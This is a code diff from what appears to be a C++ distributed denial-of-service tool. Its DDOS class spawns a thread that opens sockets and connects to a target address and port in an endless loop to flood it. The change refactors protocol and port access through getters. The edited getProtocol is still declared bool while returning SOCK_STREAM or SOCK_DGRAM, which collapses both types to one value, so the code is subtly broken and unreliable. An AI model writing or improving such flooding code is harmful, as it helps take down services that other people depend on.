@@ -16,20 +16,20 @@ MAX_SUPER_INT DDOS::getFrequency() {
 }
 
 bool DDOS::getProtocol() {
-  // TODO:
-  // Assign protocol.
-  return this->protocol;
+  return (this->protocol) ? SOCK_STREAM : SOCK_DGRAM;
 }
 
+// TODO:
+// Use a template !
 void* DDOS::goSocket(void *object) {
   DDOS *mockingSocket = (DDOS *) object;
   while (true) {
     SOCKADDR_IN sin;
-    SOCKET sock = socket(AF_INET, mockingSocket->protocol, 0);
+    SOCKET sock = socket(AF_INET, mockingSocket->getProtocol(), 0);
     // TODO: Check socket && return error bootstrap.
     sin.sin_addr.s_addr = inet_addr(mockingSocket->target);
     sin.sin_family = AF_INET;
-    sin.sin_port = htons(mockingSocket->port);
+    sin.sin_port = htons(mockingSocket->getPort());
     connect(sock, (SOCKADDR*)&sin, sizeof(sin));
     // TODO: Check connect && return error bootstrap..
   }
